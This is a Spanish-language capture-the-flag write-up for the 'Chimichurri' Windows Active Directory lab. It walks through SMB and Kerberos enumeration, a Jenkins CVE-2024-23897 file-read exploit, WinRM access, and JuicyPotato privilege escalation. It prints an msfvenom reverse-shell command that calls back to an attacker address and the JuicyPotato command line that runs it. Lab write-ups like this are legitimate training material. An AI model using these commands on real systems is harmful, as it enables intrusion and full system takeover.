---
layout: post
title: "Chimichurri - Hackerslabs - Windows AD"
date: 2026-07-27
img: /assets/img/windows/chimichurri/banner.png
tags: [VulnHub, Linux, Enumeration, Robots, Easy]
---
 ![](/secnotes/assets/img/windows/chimichurri/banner.png)

Sistema operativo: Windows Active Directory
Plataforma: The Hackers Labs

# Reconocimiento

Para comenzar utilizaremos la herramienta Auto-Recon. Suite de herramientas del sistema programadas para realizar el proceso de reconocimiento de manera automatizada. De esta forma obtenemos información de interés mientras realizamos otros procedimientos en segundo plano. Pueden encontrarla en mi perfil o descargarla [aquí](http://www.github.com/yorve/Auto_Recon)

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260726213222.png)
![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260726213316.png)

Nos encontramos frente a un Active Directory. Nos llama la atención el puerto **6969** que corresponde a un servicio web llamado **Jetty** y que aloja el archivo robots.txt

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260726213841.png)


## Enumeración SMB

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260726214544.png)
La enumeración con `crackmapexec` no nos entregó información

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727200635.png)

`smbclient` nos mostró los recursos compartidos y un directorio al cual podemos ingresar.

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727200840.png)
![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727200903.png)
![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727201038.png)
![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727201027.png)

El procedimiento fue: entrar al recurso compartido y esta nos conecto por SMB, encontramos un archivo llamado `credenciales.txt`, y con el comando `get credenciales.txt` lo transferimos a nuestra máquina atacante. 

tenemos un usuario válido y quizás una contraseña (perico) 

## Enumeración Kerberos

Para validar las cuentas del AD (Active Directory) usaremos la herramienta `kerbrute`. Esta fue diseñada para realizar fuerza bruta y enumeración de usuarios en AD aprovechando el protocolo **kerberos** en el puerto 88.

Cuando `kerbrute` valida un usuario, no intenta iniciar sesión de forma completa. Solo envía una solicitud de preautenticación Kerberos al controlador de dominio para un nombre de usuario especifico:
* Si el usuario  existe: El servidor responde con un error tipo `KDC_ERR_PREAUTH_REQUIRED`(exige la contraseña) o `KDC_ERR_KEY_EXPIRED`. Kerbrute lo interpreta como usuario válido.
* Si el usuario no existe: El servidor responde con un error `KDC_ERR_C_PRINCIPAL_UNKNOWN`(usuario no encontrado) Kerbrute lo descarta.

Sus funciones principales son la enumeración de usuarios, password spraying y fuerza bruta de contraseñas.

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727193811.png)

Esta enumeración nos encontró usuarios válidos.

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727193842.png)

Ya que tenemos usuarios del sistema, nos creamos un diccionario, y con la herramienta `impacket-GetNPUsers` validaremos si estos no requieren autenticación en kerberos.

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727194032.png)

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727194446.png)

Tras esta verificación de la preautenticación de Kerberos, confirmamos que los usuarios encontrados no cuentan con el atributo `UF_DONT_REQUIRE_PREAUTH`.

## Análisis de Jenkins

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727194709.png)

Esta versión antigua de Jenkins cuenta con múltiples fallos de seguridad corregidos en versiones posteriores, destacan problemas críticos como la lectura arbitraria de archivos vía CLI asociada a **CVE-2024-23897** y el secuestro de WebSocket **CVE-2024-23898.  

Sus riesgos principales son la lectura de archivos, permitiendo a usuarios no autenticados leer partes o archivos completos del servidor y la posibilidad de escalar a RCE (Ejecución Remota de Código). 

Con esta información validaremos estos fallos. 

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727202055.png)

* https://www.exploit-db.com/exploits/51993

Luego de navegar encontramos un script de python donde explotan la vulnerabilidad de LFI de Jenkins.

* https://www.cloudsek.com/blog/xposing-the-exploitation-how-cve-2024-23897-led-to-the-compromise-of-github-repos-via-jenkins-lfi-vulnerability

### Explotación

Al ejecutar el script podemos ver que solo necesitamos ingresar la URL y especificar la ruta del archivo que queremos ver

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727202914.png)
![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727203022.png)

y tenemos las credenciales del usuario hacker.

Volviendo a la fase de reconocimiento, vemos que la máquina víctima tiene el servicio winrm activo. Este servicio es el equivalente a SSH en Linux.

Validamos las credenciales
![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727203459.png)

con esta comprobación obtenemos 3 cosas fundamentales.
1. Credenciales válidas
2. Acceso Remoto confirmado
3. Privilegios elevados (`Pwn3d!`)

Ahora para obtener una consola de PowerShell podemos usar `evil.winrm` usando estas credenciales.

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727203828.png)

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727204127.png)
![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727204139.png)

Como vimos en el laboratorio anterior [Ensalá Papas](https://yorve.github.io/secnotes/2026/07/26/TheHackerLabs-Ensal%C3%A1Papas.html), contar con `SeImpersonatePrivilege`, podemos forzar al sistema a autenticarse contra un servidor local y elevar nuestros privilegios  a `SYSTEM`

Nos creamos el archivo de la reverse shell con `msfvenom`

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.192.139 LPORT=443 EXITFUNC=thread -f exe -a x86 -o rs.exe`

Subimos los dos archivos necesarios (`JuicyPotato.exe` y)

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727214709.png)
![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727214732.png)

Ponemos nuestro puerto 443 en escucha y ejecutamos los archivos apuntando a cmd del sistema 

`./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 443 -a "/c C:\Users\hacker\Documents\rs.exe"`

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727215116.png)

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727215021.png)

En esta ocasión no fue necesario poner el **CLSID** del Sistema Operativo..

![](/secnotes/assets/img/windows/chimichurri/Pasted%20image%2020260727215956.png)
